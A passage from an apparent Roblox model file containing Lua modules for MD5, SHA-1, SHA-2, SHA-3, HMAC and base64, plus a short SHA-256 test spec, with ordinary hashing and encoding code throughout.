			L21_hi, L22_hi, L23_hi, L24_hi, L25_hi = bit32_bxor(L23_hi, bit32_band(-1 - L24_hi, L25_hi)), bit32_bxor(L24_hi, bit32_band(-1 - L25_hi, L21_hi)), bit32_bxor(L25_hi, bit32_band(-1 - L21_hi, L22_hi)), bit32_bxor(L21_hi, bit32_band(-1 - L22_hi, L23_hi)), bit32_bxor(L22_hi, bit32_band(-1 - L23_hi, L24_hi))
			L01_lo = bit32_bxor(L01_lo, RC_lo[round_idx])
			L01_hi = L01_hi + RC_hi[round_idx] -- RC_hi[] is either 0 or 0x80000000, so we could use fast addition instead of slow XOR
		end

		lanes_lo[1] = L01_lo
		lanes_hi[1] = L01_hi
		lanes_lo[2] = L02_lo
		lanes_hi[2] = L02_hi
		lanes_lo[3] = L03_lo
		lanes_hi[3] = L03_hi
		lanes_lo[4] = L04_lo
		lanes_hi[4] = L04_hi
		lanes_lo[5] = L05_lo
		lanes_hi[5] = L05_hi
		lanes_lo[6] = L06_lo
		lanes_hi[6] = L06_hi
		lanes_lo[7] = L07_lo
		lanes_hi[7] = L07_hi
		lanes_lo[8] = L08_lo
		lanes_hi[8] = L08_hi
		lanes_lo[9] = L09_lo
		lanes_hi[9] = L09_hi
		lanes_lo[10] = L10_lo
		lanes_hi[10] = L10_hi
		lanes_lo[11] = L11_lo
		lanes_hi[11] = L11_hi
		lanes_lo[12] = L12_lo
		lanes_hi[12] = L12_hi
		lanes_lo[13] = L13_lo
		lanes_hi[13] = L13_hi
		lanes_lo[14] = L14_lo
		lanes_hi[14] = L14_hi
		lanes_lo[15] = L15_lo
		lanes_hi[15] = L15_hi
		lanes_lo[16] = L16_lo
		lanes_hi[16] = L16_hi
		lanes_lo[17] = L17_lo
		lanes_hi[17] = L17_hi
		lanes_lo[18] = L18_lo
		lanes_hi[18] = L18_hi
		lanes_lo[19] = L19_lo
		lanes_hi[19] = L19_hi
		lanes_lo[20] = L20_lo
		lanes_hi[20] = L20_hi
		lanes_lo[21] = L21_lo
		lanes_hi[21] = L21_hi
		lanes_lo[22] = L22_lo
		lanes_hi[22] = L22_hi
		lanes_lo[23] = L23_lo
		lanes_hi[23] = L23_hi
		lanes_lo[24] = L24_lo
		lanes_hi[24] = L24_hi
		lanes_lo[25] = L25_lo
		lanes_hi[25] = L25_hi
	end
end

--------------------------------------------------------------------------------
-- MAGIC NUMBERS CALCULATOR
--------------------------------------------------------------------------------
-- Q:
--    Is 53-bit "double" math enough to calculate square roots and cube roots of primes with 64 correct bits after decimal point?
-- A:
--    Yes, 53-bit "double" arithmetic is enough.
--    We could obtain first 40 bits by direct calculation of p^(1/3) and next 40 bits by one step of Newton's method.
do
	local function mul(src1, src2, factor, result_length)
		-- src1, src2 - long integers (arrays of digits in base TWO_POW_24)
		-- factor - small integer
		-- returns long integer result (src1 * src2 * factor) and its floating point approximation
		local result, carry, value, weight = table.create(result_length), 0, 0, 1
		for j = 1, result_length do
			for k = math.max(1, j + 1 - #src2), math.min(j, #src1) do
				carry = carry + factor * src1[k] * src2[j + 1 - k] -- "int32" is not enough for multiplication result, that's why "factor" must be of type "double"
			end

			local digit = carry % TWO_POW_24
			result[j] = math.floor(digit)
			carry = (carry - digit) / TWO_POW_24
			value = value + digit * weight
			weight = weight * TWO_POW_24
		end

		return result, value
	end

	local idx, step, p, one, sqrt_hi, sqrt_lo = 0, {4, 1, 2, -2, 2}, 4, {1}, sha2_H_hi, sha2_H_lo
	repeat
		p = p + step[p % 6]
		local d = 1
		repeat
			d = d + step[d % 6]
			if d * d > p then
				-- next prime number is found
				local root = p ^ (1 / 3)
				local R = root * TWO_POW_40
				R = mul(table.create(1, math.floor(R)), one, 1, 2)
				local _, delta = mul(R, mul(R, R, 1, 4), -1, 4)
				local hi = R[2] % 65536 * 65536 + math.floor(R[1] / 256)
				local lo = R[1] % 256 * 16777216 + math.floor(delta * (TWO_POW_NEG_56 / 3) * root / p)

				if idx < 16 then
					root = math.sqrt(p)
					R = root * TWO_POW_40
					R = mul(table.create(1, math.floor(R)), one, 1, 2)
					_, delta = mul(R, R, -1, 2)
					local hi = R[2] % 65536 * 65536 + math.floor(R[1] / 256)
					local lo = R[1] % 256 * 16777216 + math.floor(delta * TWO_POW_NEG_17 / root)
					local idx = idx % 8 + 1
					sha2_H_ext256[224][idx] = lo
					sqrt_hi[idx], sqrt_lo[idx] = hi, lo + hi * hi_factor
					if idx > 7 then
						sqrt_hi, sqrt_lo = sha2_H_ext512_hi[384], sha2_H_ext512_lo[384]
					end
				end

				idx = idx + 1
				sha2_K_hi[idx], sha2_K_lo[idx] = hi, lo % K_lo_modulo + hi * hi_factor
				break
			end
		until p % d == 0
	until idx > 79
end

-- Calculating IVs for SHA512/224 and SHA512/256
for width = 224, 256, 32 do
	local H_lo, H_hi = {}, nil
	if XOR64A5 then
		for j = 1, 8 do
			H_lo[j] = XOR64A5(sha2_H_lo[j])
		end
	else
		H_hi = {}
		for j = 1, 8 do
			H_lo[j] = bit32_bxor(sha2_H_lo[j], 0xA5A5A5A5) % 4294967296
			H_hi[j] = bit32_bxor(sha2_H_hi[j], 0xA5A5A5A5) % 4294967296
		end
	end

	sha512_feed_128(H_lo, H_hi, "SHA-512/" .. tostring(width) .. "\128" .. string.rep("\0", 115) .. "\88", 0, 128)
	sha2_H_ext512_lo[width] = H_lo
	sha2_H_ext512_hi[width] = H_hi
end

-- Constants for MD5
do
	for idx = 1, 64 do
		-- we can't use formula math.floor(abs(sin(idx))*TWO_POW_32) because its result may be beyond integer range on Lua built with 32-bit integers
		local hi, lo = math.modf(math.abs(math.sin(idx)) * TWO_POW_16)
		md5_K[idx] = hi * 65536 + math.floor(lo * TWO_POW_16)
	end
end

-- Constants for SHA3
do
	local sh_reg = 29
	local function next_bit()
		local r = sh_reg % 2
		sh_reg = bit32_bxor((sh_reg - r) / 2, 142 * r)
		return r
	end

	for idx = 1, 24 do
		local lo, m = 0, nil
		for _ = 1, 6 do
			m = m and m * m * 2 or 1
			lo = lo + next_bit() * m
		end

		local hi = next_bit() * m
		sha3_RC_hi[idx], sha3_RC_lo[idx] = hi, lo + hi * hi_factor_keccak
	end
end

--------------------------------------------------------------------------------
-- MAIN FUNCTIONS
--------------------------------------------------------------------------------
local function sha256ext(width, message)
	-- Create an instance (private objects for current calculation)
	local Array256 = sha2_H_ext256[width] -- # == 8
	local length, tail = 0, ""
	local H = table.create(8)
	H[1], H[2], H[3], H[4], H[5], H[6], H[7], H[8] = Array256[1], Array256[2], Array256[3], Array256[4], Array256[5], Array256[6], Array256[7], Array256[8]

	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				length = length + partLength
				local offs = 0
				local tailLength = #tail
				if tail ~= "" and tailLength + partLength >= 64 then
					offs = 64 - tailLength
					sha256_feed_64(H, tail .. string.sub(message_part, 1, offs), 0, 64)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % 64
				sha256_feed_64(H, message_part, offs, size - size_tail)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				local final_blocks = table.create(10) --{tail, "\128", string.rep("\0", (-9 - length) % 64 + 1)}
				final_blocks[1] = tail
				final_blocks[2] = "\128"
				final_blocks[3] = string.rep("\0", (-9 - length) % 64 + 1)

				tail = nil
				-- Assuming user data length is shorter than (TWO_POW_53)-9 bytes
				-- Anyway, it looks very unrealistic that someone would spend more than a year of calculations to process TWO_POW_53 bytes of data by using this Lua script :-)
				-- TWO_POW_53 bytes = TWO_POW_56 bits, so "bit-counter" fits in 7 bytes
				length = length * (8 / TWO56_POW_7) -- convert "byte-counter" to "bit-counter" and move decimal point to the left
				for j = 4, 10 do
					length = length % 1 * 256
					final_blocks[j] = string.char(math.floor(length))
				end

				final_blocks = table.concat(final_blocks)
				sha256_feed_64(H, final_blocks, 0, #final_blocks)
				local max_reg = width / 32
				for j = 1, max_reg do
					H[j] = string.format("%08x", H[j] % 4294967296)
				end

				H = table.concat(H, "", 1, max_reg)
			end

			return H
		end
	end

	if message then
		-- Actually perform calculations and return the SHA256 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get SHA256 digest by invoking this function without an argument
		return partial
	end
end

local function sha512ext(width, message)

	-- Create an instance (private objects for current calculation)
	local length, tail, H_lo, H_hi = 0, "", table.pack(table.unpack(sha2_H_ext512_lo[width])), not HEX64 and table.pack(table.unpack(sha2_H_ext512_hi[width]))

	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				length = length + partLength
				local offs = 0
				if tail ~= "" and #tail + partLength >= 128 then
					offs = 128 - #tail
					sha512_feed_128(H_lo, H_hi, tail .. string.sub(message_part, 1, offs), 0, 128)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % 128
				sha512_feed_128(H_lo, H_hi, message_part, offs, size - size_tail)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				local final_blocks = table.create(3) --{tail, "\128", string.rep("\0", (-17-length) % 128 + 9)}
				final_blocks[1] = tail
				final_blocks[2] = "\128"
				final_blocks[3] = string.rep("\0", (-17 - length) % 128 + 9)

				tail = nil
				-- Assuming user data length is shorter than (TWO_POW_53)-17 bytes
				-- TWO_POW_53 bytes = TWO_POW_56 bits, so "bit-counter" fits in 7 bytes
				length = length * (8 / TWO56_POW_7) -- convert "byte-counter" to "bit-counter" and move floating point to the left
				for j = 4, 10 do
					length = length % 1 * 256
					final_blocks[j] = string.char(math.floor(length))
				end

				final_blocks = table.concat(final_blocks)
				sha512_feed_128(H_lo, H_hi, final_blocks, 0, #final_blocks)
				local max_reg = math.ceil(width / 64)

				if HEX64 then
					for j = 1, max_reg do
						H_lo[j] = HEX64(H_lo[j])
					end
				else
					for j = 1, max_reg do
						H_lo[j] = string.format("%08x", H_hi[j] % 4294967296) .. string.format("%08x", H_lo[j] % 4294967296)
					end

					H_hi = nil
				end

				H_lo = string.sub(table.concat(H_lo, "", 1, max_reg), 1, width / 4)
			end

			return H_lo
		end
	end

	if message then
		-- Actually perform calculations and return the SHA512 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get SHA512 digest by invoking this function without an argument
		return partial
	end
end

local function md5(message)

	-- Create an instance (private objects for current calculation)
	local H, length, tail = table.create(4), 0, ""
	H[1], H[2], H[3], H[4] = md5_sha1_H[1], md5_sha1_H[2], md5_sha1_H[3], md5_sha1_H[4]

	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				length = length + partLength
				local offs = 0
				if tail ~= "" and #tail + partLength >= 64 then
					offs = 64 - #tail
					md5_feed_64(H, tail .. string.sub(message_part, 1, offs), 0, 64)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % 64
				md5_feed_64(H, message_part, offs, size - size_tail)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				local final_blocks = table.create(3) --{tail, "\128", string.rep("\0", (-9 - length) % 64)}
				final_blocks[1] = tail
				final_blocks[2] = "\128"
				final_blocks[3] = string.rep("\0", (-9 - length) % 64)
				tail = nil
				length = length * 8 -- convert "byte-counter" to "bit-counter"
				for j = 4, 11 do
					local low_byte = length % 256
					final_blocks[j] = string.char(low_byte)
					length = (length - low_byte) / 256
				end

				final_blocks = table.concat(final_blocks)
				md5_feed_64(H, final_blocks, 0, #final_blocks)
				for j = 1, 4 do
					H[j] = string.format("%08x", H[j] % 4294967296)
				end

				H = string.gsub(table.concat(H), "(..)(..)(..)(..)", "%4%3%2%1")
			end

			return H
		end
	end

	if message then
		-- Actually perform calculations and return the MD5 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get MD5 digest by invoking this function without an argument
		return partial
	end
end

local function sha1(message)
	-- Create an instance (private objects for current calculation)
	local H, length, tail = table.pack(table.unpack(md5_sha1_H)), 0, ""

	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				length = length + partLength
				local offs = 0
				if tail ~= "" and #tail + partLength >= 64 then
					offs = 64 - #tail
					sha1_feed_64(H, tail .. string.sub(message_part, 1, offs), 0, 64)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % 64
				sha1_feed_64(H, message_part, offs, size - size_tail)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				local final_blocks = table.create(10) --{tail, "\128", string.rep("\0", (-9 - length) % 64 + 1)}
				final_blocks[1] = tail
				final_blocks[2] = "\128"
				final_blocks[3] = string.rep("\0", (-9 - length) % 64 + 1)
				tail = nil

				-- Assuming user data length is shorter than (TWO_POW_53)-9 bytes
				-- TWO_POW_53 bytes = TWO_POW_56 bits, so "bit-counter" fits in 7 bytes
				length = length * (8 / TWO56_POW_7) -- convert "byte-counter" to "bit-counter" and move decimal point to the left
				for j = 4, 10 do
					length = length % 1 * 256
					final_blocks[j] = string.char(math.floor(length))
				end

				final_blocks = table.concat(final_blocks)
				sha1_feed_64(H, final_blocks, 0, #final_blocks)
				for j = 1, 5 do
					H[j] = string.format("%08x", H[j] % 4294967296)
				end

				H = table.concat(H)
			end

			return H
		end
	end

	if message then
		-- Actually perform calculations and return the SHA-1 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get SHA-1 digest by invoking this function without an argument
		return partial
	end
end

local function keccak(block_size_in_bytes, digest_size_in_bytes, is_SHAKE, message)
	-- "block_size_in_bytes" is multiple of 8
	if type(digest_size_in_bytes) ~= "number" then
		-- arguments in SHAKE are swapped:
		--    NIST FIPS 202 defines SHAKE(message,num_bits)
		--    this module   defines SHAKE(num_bytes,message)
		-- it's easy to forget about this swap, hence the check
		error("Argument 'digest_size_in_bytes' must be a number", 2)
	end

	-- Create an instance (private objects for current calculation)
	local tail, lanes_lo, lanes_hi = "", table.create(25, 0), hi_factor_keccak == 0 and table.create(25, 0)
	local result

	--~     pad the input N using the pad function, yielding a padded bit string P with a length divisible by r (such that n = len(P)/r is integer),
	--~     break P into n consecutive r-bit pieces P0, ..., Pn-1 (last is zero-padded)
	--~     initialize the state S to a string of b 0 bits.
	--~     absorb the input into the state: For each block Pi,
	--~         extend Pi at the end by a string of c 0 bits, yielding one of length b,
	--~         XOR that with S and
	--~         apply the block permutation f to the result, yielding a new state S
	--~     initialize Z to be the empty string
	--~     while the length of Z is less than d:
	--~         append the first r bits of S to Z
	--~         if Z is still less than d bits long, apply f to S, yielding a new state S.
	--~     truncate Z to d bits
	local function partial(message_part)
		if message_part then
			local partLength = #message_part
			if tail then
				local offs = 0
				if tail ~= "" and #tail + partLength >= block_size_in_bytes then
					offs = block_size_in_bytes - #tail
					keccak_feed(lanes_lo, lanes_hi, tail .. string.sub(message_part, 1, offs), 0, block_size_in_bytes, block_size_in_bytes)
					tail = ""
				end

				local size = partLength - offs
				local size_tail = size % block_size_in_bytes
				keccak_feed(lanes_lo, lanes_hi, message_part, offs, size - size_tail, block_size_in_bytes)
				tail = tail .. string.sub(message_part, partLength + 1 - size_tail)
				return partial
			else
				error("Adding more chunks is not allowed after receiving the result", 2)
			end
		else
			if tail then
				-- append the following bits to the message: for usual SHA3: 011(0*)1, for SHAKE: 11111(0*)1
				local gap_start = is_SHAKE and 31 or 6
				tail = tail .. (#tail + 1 == block_size_in_bytes and string.char(gap_start + 128) or string.char(gap_start) .. string.rep("\0", (-2 - #tail) % block_size_in_bytes) .. "\128")
				keccak_feed(lanes_lo, lanes_hi, tail, 0, #tail, block_size_in_bytes)
				tail = nil

				local lanes_used = 0
				local total_lanes = math.floor(block_size_in_bytes / 8)
				local qwords = {}

				local function get_next_qwords_of_digest(qwords_qty)
					-- returns not more than 'qwords_qty' qwords ('qwords_qty' might be non-integer)
					-- doesn't go across keccak-buffer boundary
					-- block_size_in_bytes is a multiple of 8, so, keccak-buffer contains integer number of qwords
					if lanes_used >= total_lanes then
						keccak_feed(lanes_lo, lanes_hi, "\0\0\0\0\0\0\0\0", 0, 8, 8)
						lanes_used = 0
					end

					qwords_qty = math.floor(math.min(qwords_qty, total_lanes - lanes_used))
					if hi_factor_keccak ~= 0 then
						for j = 1, qwords_qty do
							qwords[j] = HEX64(lanes_lo[lanes_used + j - 1 + lanes_index_base])
						end
					else
						for j = 1, qwords_qty do
							qwords[j] = string.format("%08x", lanes_hi[lanes_used + j] % 4294967296) .. string.format("%08x", lanes_lo[lanes_used + j] % 4294967296)
						end
					end

					lanes_used = lanes_used + qwords_qty
					return string.gsub(table.concat(qwords, "", 1, qwords_qty), "(..)(..)(..)(..)(..)(..)(..)(..)", "%8%7%6%5%4%3%2%1"), qwords_qty * 8
				end

				local parts = {} -- digest parts
				local last_part, last_part_size = "", 0

				local function get_next_part_of_digest(bytes_needed)
					-- returns 'bytes_needed' bytes, for arbitrary integer 'bytes_needed'
					bytes_needed = bytes_needed or 1
					if bytes_needed <= last_part_size then
						last_part_size = last_part_size - bytes_needed
						local part_size_in_nibbles = bytes_needed * 2
						local result = string.sub(last_part, 1, part_size_in_nibbles)
						last_part = string.sub(last_part, part_size_in_nibbles + 1)
						return result
					end

					local parts_qty = 0
					if last_part_size > 0 then
						parts_qty = 1
						parts[parts_qty] = last_part
						bytes_needed = bytes_needed - last_part_size
					end

					-- repeats until the length is enough
					while bytes_needed >= 8 do
						local next_part, next_part_size = get_next_qwords_of_digest(bytes_needed / 8)
						parts_qty = parts_qty + 1
						parts[parts_qty] = next_part
						bytes_needed = bytes_needed - next_part_size
					end

					if bytes_needed > 0 then
						last_part, last_part_size = get_next_qwords_of_digest(1)
						parts_qty = parts_qty + 1
						parts[parts_qty] = get_next_part_of_digest(bytes_needed)
					else
						last_part, last_part_size = "", 0
					end

					return table.concat(parts, "", 1, parts_qty)
				end

				if digest_size_in_bytes < 0 then
					result = get_next_part_of_digest
				else
					result = get_next_part_of_digest(digest_size_in_bytes)
				end

			end

			return result
		end
	end

	if message then
		-- Actually perform calculations and return the SHA3 digest of a message
		return partial(message)()
	else
		-- Return function for chunk-by-chunk loading
		-- User should feed every chunk of input data as single argument to this function and finally get SHA3 digest by invoking this function without an argument
		return partial
	end
end

local function HexToBinFunction(hh)
	return string.char(tonumber(hh, 16))
end

local function hex2bin(hex_string)
	return (string.gsub(hex_string, "%x%x", HexToBinFunction))
end

local base64_symbols = {
	["+"] = 62, ["-"] = 62, [62] = "+";
	["/"] = 63, ["_"] = 63, [63] = "/";
	["="] = -1, ["."] = -1, [-1] = "=";
}

local symbol_index = 0
for j, pair in ipairs{"AZ", "az", "09"} do
	for ascii = string.byte(pair), string.byte(pair, 2) do
		local ch = string.char(ascii)
		base64_symbols[ch] = symbol_index
		base64_symbols[symbol_index] = ch
		symbol_index = symbol_index + 1
	end
end

local function bin2base64(binary_string)
	local stringLength = #binary_string
	local result = table.create(math.ceil(stringLength / 3))
	local length = 0

	for pos = 1, #binary_string, 3 do
		local c1, c2, c3, c4 = string.byte(string.sub(binary_string, pos, pos + 2) .. '\0', 1, -1)
		length = length + 1
		result[length] =
			base64_symbols[math.floor(c1 / 4)] ..
			base64_symbols[c1 % 4 * 16 + math.floor(c2 / 16)] ..
			base64_symbols[c3 and c2 % 16 * 4 + math.floor(c3 / 64) or -1] ..
			base64_symbols[c4 and c3 % 64 or -1]
	end

	return table.concat(result)
end

local function base642bin(base64_string)
	local result, chars_qty = {}, 3
	for pos, ch in string.gmatch(string.gsub(base64_string, "%s+", ""), "()(.)") do
		local code = base64_symbols[ch]
		if code < 0 then
			chars_qty = chars_qty - 1
			code = 0
		end

		local idx = pos % 4
		if idx > 0 then
			result[-idx] = code
		else
			local c1 = result[-1] * 4 + math.floor(result[-2] / 16)
			local c2 = (result[-2] % 16) * 16 + math.floor(result[-3] / 4)
			local c3 = (result[-3] % 4) * 64 + code
			result[#result + 1] = string.sub(string.char(c1, c2, c3), 1, chars_qty)
		end
	end

	return table.concat(result)
end

local block_size_for_HMAC -- this table will be initialized at the end of the module
--local function pad_and_xor(str, result_length, byte_for_xor)
--	return string.gsub(str, ".", function(c)
--		return string.char(bit32_bxor(string.byte(c), byte_for_xor))
--	end) .. string.rep(string.char(byte_for_xor), result_length - #str)
--end

-- For the sake of speed of converting hexes to strings, there's a map of the conversions here
local BinaryStringMap = {}
for Index = 0, 255 do
	BinaryStringMap[string.format("%02x", Index)] = string.char(Index)
end

-- Update 02.14.20 - added AsBinary for easy GameAnalytics replacement.
local function hmac(hash_func, key, message, AsBinary)
	-- Create an instance (private objects for current calculation)
	local block_size = block_size_for_HMAC[hash_func]
	if not block_size then
		error("Unknown hash function", 2)
	end

	local KeyLength = #key
	if KeyLength > block_size then
		key = string.gsub(hash_func(key), "%x%x", HexToBinFunction)
		KeyLength = #key
	end

	local append = hash_func()(string.gsub(key, ".", function(c)
		return string.char(bit32_bxor(string.byte(c), 0x36))
	end) .. string.rep("6", block_size - KeyLength)) -- 6 = string.char(0x36)

	local result

	local function partial(message_part)
		if not message_part then
			result = result or hash_func(
				string.gsub(key, ".", function(c)
					return string.char(bit32_bxor(string.byte(c), 0x5c))
				end) .. string.rep("\\", block_size - KeyLength) -- \ = string.char(0x5c)
				.. (string.gsub(append(), "%x%x", HexToBinFunction))
			)

			return result
		elseif result then
			error("Adding more chunks is not allowed after receiving the result", 2)
		else
			append(message_part)
			return partial
		end
	end

	if message then
		-- Actually perform calculations and return the HMAC of a message
		local FinalMessage = partial(message)()
		return AsBinary and (string.gsub(FinalMessage, "%x%x", BinaryStringMap)) or FinalMessage
	else
		-- Return function for chunk-by-chunk loading of a message
		-- User should feed every chunk of the message as single argument to this function and finally get HMAC by invoking this function without an argument
		return partial
	end
end

local sha = {
	md5 = md5,
	sha1 = sha1,
	-- SHA2 hash functions:
	sha224 = function(message)
		return sha256ext(224, message)
	end;

	sha256 = function(message)
		return sha256ext(256, message)
	end;

	sha512_224 = function(message)
		return sha512ext(224, message)
	end;

	sha512_256 = function(message)
		return sha512ext(256, message)
	end;

	sha384 = function(message)
		return sha512ext(384, message)
	end;

	sha512 = function(message)
		return sha512ext(512, message)
	end;

	-- SHA3 hash functions:
	sha3_224 = function(message)
		return keccak((1600 - 2 * 224) / 8, 224 / 8, false, message)
	end;

	sha3_256 = function(message)
		return keccak((1600 - 2 * 256) / 8, 256 / 8, false, message)
	end;

	sha3_384 = function(message)
		return keccak((1600 - 2 * 384) / 8, 384 / 8, false, message)
	end;

	sha3_512 = function(message)
		return keccak((1600 - 2 * 512) / 8, 512 / 8, false, message)
	end;

	shake128 = function(message, digest_size_in_bytes)
		return keccak((1600 - 2 * 128) / 8, digest_size_in_bytes, true, message)
	end;

	shake256 = function(message, digest_size_in_bytes)
		return keccak((1600 - 2 * 256) / 8, digest_size_in_bytes, true, message)
	end;

	-- misc utilities:
	hmac = hmac; -- HMAC(hash_func, key, message) is applicable to any hash function from this module except SHAKE*
	hex_to_bin = hex2bin; -- converts hexadecimal representation to binary string
	base64_to_bin = base642bin; -- converts base64 representation to binary string
	bin_to_base64 = bin2base64; -- converts binary string to base64 representation
	base64_encode = Base64.Encode;
	base64_decode = Base64.Decode;
}

block_size_for_HMAC = {
	[sha.md5] = 64;
	[sha.sha1] = 64;
	[sha.sha224] = 64;
	[sha.sha256] = 64;
	[sha.sha512_224] = 128;
	[sha.sha512_256] = 128;
	[sha.sha384] = 128;
	[sha.sha512] = 128;
	[sha.sha3_224] = (1600 - 2 * 224) / 8;
	[sha.sha3_256] = (1600 - 2 * 256) / 8;
	[sha.sha3_384] = (1600 - 2 * 384) / 8;
	[sha.sha3_512] = (1600 - 2 * 512) / 8;
}

return sha]]></ProtectedString>
				<int64 name="SourceAssetId">-1</int64>
				<BinaryString name="Tags"></BinaryString>
			</Properties>
			<Item class="ModuleScript" referent="RBXD35AFF3235804BEFBFB274AB4685095E">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Base64</string>
					<string name="ScriptGuid">{B6F7C566-6D9A-4D58-AF98-8273F2F07A1F}</string>
					<ProtectedString name="Source"><![CDATA[-- @original: https://gist.github.com/Reselim/40d62b17d138cc74335a1b0709e19ce2
local Alphabet = {}
local Indexes = {}

-- A-Z
for Index = 65, 90 do
	table.insert(Alphabet, Index)
end

-- a-z
for Index = 97, 122 do
	table.insert(Alphabet, Index)
end

-- 0-9
for Index = 48, 57 do
	table.insert(Alphabet, Index)
end

table.insert(Alphabet, 43) -- +
table.insert(Alphabet, 47) -- /

for Index, Character in ipairs(Alphabet) do
	Indexes[Character] = Index
end

local Base64 = {}

local bit32_rshift = bit32.rshift
local bit32_lshift = bit32.lshift
local bit32_band = bit32.band

--[[**
	Encodes a string in Base64.
	@param [t:string] Input The input string to encode.
	@returns [t:string] The string encoded in Base64.
**--]]
function Base64.Encode(Input)
	local Output = {}
	local Length = 0

	for Index = 1, #Input, 3 do
		local C1, C2, C3 = string.byte(Input, Index, Index + 2)

		local A = bit32_rshift(C1, 2)
		local B = bit32_lshift(bit32_band(C1, 3), 4) + bit32_rshift(C2 or 0, 4)
		local C = bit32_lshift(bit32_band(C2 or 0, 15), 2) + bit32_rshift(C3 or 0, 6)
		local D = bit32_band(C3 or 0, 63)

		Length = Length + 1
		Output[Length] = Alphabet[A + 1]

		Length = Length + 1
		Output[Length] = Alphabet[B + 1]

		Length = Length + 1
		Output[Length] = C2 and Alphabet[C + 1] or 61

		Length = Length + 1
		Output[Length] = C3 and Alphabet[D + 1] or 61
	end

	local NewOutput = {}
	local NewLength = 0
	local IndexAdd4096Sub1

	for Index = 1, Length, 4096 do
		NewLength = NewLength + 1
		IndexAdd4096Sub1 = Index + 4096 - 1

		NewOutput[NewLength] = string.char(table.unpack(
			Output,
			Index,
			IndexAdd4096Sub1 > Length and Length or IndexAdd4096Sub1
		))
	end

	return table.concat(NewOutput)
end

--[[**
	Decodes a string from Base64.
	@param [t:string] Input The input string to decode.
	@returns [t:string] The newly decoded string.
**--]]
function Base64.Decode(Input)
	local Output = {}
	local Length = 0

	for Index = 1, #Input, 4 do
		local C1, C2, C3, C4 = string.byte(Input, Index, Index + 3)

		local I1 = Indexes[C1] - 1
		local I2 = Indexes[C2] - 1
		local I3 = (Indexes[C3] or 1) - 1
		local I4 = (Indexes[C4] or 1) - 1

		local A = bit32_lshift(I1, 2) + bit32_rshift(I2, 4)
		local B = bit32_lshift(bit32_band(I2, 15), 4) + bit32_rshift(I3, 2)
		local C = bit32_lshift(bit32_band(I3, 3), 6) + I4

		Length = Length + 1
		Output[Length] = A

		if C3 ~= 61 then
			Length = Length + 1
			Output[Length] = B
		end

		if C4 ~= 61 then
			Length = Length + 1
			Output[Length] = C
		end
	end

	local NewOutput = {}
	local NewLength = 0
	local IndexAdd4096Sub1

	for Index = 1, Length, 4096 do
		NewLength = NewLength + 1
		IndexAdd4096Sub1 = Index + 4096 - 1

		NewOutput[NewLength] = string.char(table.unpack(
			Output,
			Index,
			IndexAdd4096Sub1 > Length and Length or IndexAdd4096Sub1
		))
	end

	return table.concat(NewOutput)
end

return Base64]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
			<Item class="ModuleScript" referent="RBX78B007CC05CB4573AF6CD4F53FBD9F0D">
				<Properties>
					<BinaryString name="AttributesSerialize"></BinaryString>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">HashLib.spec</string>
					<string name="ScriptGuid">{873F438E-504E-4C35-8512-F5DFAF90830F}</string>
					<ProtectedString name="Source"><![CDATA[local function describe(phrase, callback) end
local function it(phrase, callback) end
local function expect(value) end

return function()
	local HashLib = require(script.Parent)
	local sha256 = HashLib.sha256

	describe("HashLib.sha256", function()
		it("should properly encode strings", function()
			expect(sha256("abc").to.equal("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad"))
			expect(sha256("The quick brown fox jumps over the lazy dog").to.equal("d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592"))
			expect(sha256("123456").to.equal("8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92"))
		end)

		it("should create a private closure that works", function()
			local AppendNextChunk = sha256()
			AppendNextChunk("The quick brown fox")
			AppendNextChunk(" jumps ")
			AppendNextChunk("") -- chunk may be an empty string
			AppendNextChunk("over the lazy dog")
			expect(AppendNextChunk()).to.equal("d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592")
		end)

		it("should allow the private closure to work if called twice", function()
			local AppendNextChunk = sha256()
			AppendNextChunk("The quick brown fox")
			AppendNextChunk(" jumps ")
			AppendNextChunk("") -- chunk may be an empty string
			AppendNextChunk("over the lazy dog")
			AppendNextChunk()
			expect(AppendNextChunk()).to.equal("d7a8fbb307d7809469ca9abcb0082e4f8d5651e46d3cdb762d02d0bf37c9e592")
		end)
	end)
end]]></ProtectedString>
					<int64 name="SourceAssetId">-1</int64>
					<BinaryString name="Tags"></BinaryString>
				</Properties>
			</Item>
		</Item>
		<Item class="ModuleScript" referent="RBX52737272C2F04252BC30C58496AA339C">
			<Properties>
				<BinaryString name="AttributesSerialize"></BinaryString>
				<Content name="LinkedSource"><null></null></Content>
				<string name="Name">RoactRodux</string>
				<string name="ScriptGuid">{047F3DAB-D53F-45F2-852E-762DFC2D73C1}</string>
